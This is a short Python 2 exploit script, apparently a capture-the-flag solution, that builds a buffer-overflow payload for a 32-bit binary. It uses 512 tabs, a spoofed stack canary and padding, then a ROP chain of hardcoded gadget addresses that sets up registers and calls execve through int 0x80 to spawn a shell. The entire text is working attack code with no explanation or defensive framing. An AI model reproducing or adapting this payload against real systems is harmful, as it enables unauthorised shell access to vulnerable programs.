from struct import pack

name = 'AAAA'

print name
print 'A'

p  = '\t'*512
p += '/hom'					# canary
p += pack('<L', 0x804c008)  # canary addr - malloc addr for note_file_path
p += 'C'*16     			# padding
p += pack('<L', 0xf7f15a31) # pop edx, ecx, ebx ; ret
p += pack('<L', 0x8049f10)  # null em .init_array
p += pack('<L', 0x8049f10)  # null em .init_array
p += pack('<L', 0x8048194)  # GNU

p += pack('<L', 0xf7f0c052) # pop eax; ret
p += pack('<L', 0xb)        # execve

p += pack('<L', 0xf7e4a615) # int $0x80

print p
